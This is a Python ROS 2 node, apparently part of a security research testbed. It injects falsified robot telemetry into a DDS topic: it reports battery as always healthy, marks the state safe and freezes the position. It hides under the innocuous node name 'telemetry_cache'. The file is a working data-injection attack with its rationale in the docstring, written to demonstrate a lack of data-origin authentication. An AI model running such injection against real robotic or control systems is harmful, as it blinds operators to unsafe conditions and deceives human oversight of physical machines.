"""ATTACKER 2 — telemetry falsification (DDS-level MITM analogue).

Threat: an adversary on the DDS domain subscribes to the robot's telemetry and
publishes a competing, falsified copy on the same topic. Because DDS allows
multiple publishers per topic and there is no data-origin authentication,
mission control receives both the real and the forged samples and can be misled
about the robot's state (here: battery always "healthy", position frozen).

HONESTY NOTE — this is not a classic in-path MITM. DDS is peer-to-peer, so
intercepting-and-rewriting a specific sample in transit requires network-layer
redirection (ARP spoofing / traffic mirroring), which is constrained inside a
CNI pod network. This node demonstrates the *achievable* DDS-level attack —
data injection / sensor spoofing — and docs/scenarios.md documents the true
in-path variant and its network prerequisites. Do not overclaim in the paper.

Maps to CWE-345 (Insufficient Verification of Data Authenticity).

Env:
  FAKE_BATTERY   battery value to always report (default 99.0)
"""
import json
import os

import rclpy
from rclpy.node import Node
from std_msgs.msg import String

from .common import TOPIC_TELEMETRY, sensor_qos


class MitmNode(Node):
    def __init__(self):
        super().__init__("telemetry_cache")  # innocuous-looking name
        self.fake_battery = float(os.environ.get("FAKE_BATTERY", "99.0"))
        self.frozen_pose = None
        self.pub = self.create_publisher(String, TOPIC_TELEMETRY, sensor_qos())
        self.create_subscription(String, TOPIC_TELEMETRY, self.on_telemetry, sensor_qos())
        self.get_logger().warn(
            "MITM/falsification active on %s (forcing battery=%.0f, freezing pose)"
            % (TOPIC_TELEMETRY, self.fake_battery)
        )

    def on_telemetry(self, msg: String):
        try:
            data = json.loads(msg.data)
        except json.JSONDecodeError:
            return
        # Ignore our own forged samples to avoid a feedback loop.
        if data.get("source") == "mitm":
            return

        if self.frozen_pose is None:
            self.frozen_pose = (data.get("x"), data.get("y"), data.get("heading"))

        forged = dict(data)
        forged["battery"] = self.fake_battery
        forged["unsafe"] = False
        forged["x"], forged["y"], forged["heading"] = self.frozen_pose
        forged["source"] = "mitm"

        out = String()
        out.data = json.dumps(forged)
        self.pub.publish(out)


def main():
    rclpy.init()
    node = MitmNode()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.try_shutdown()


if __name__ == "__main__":
    main()
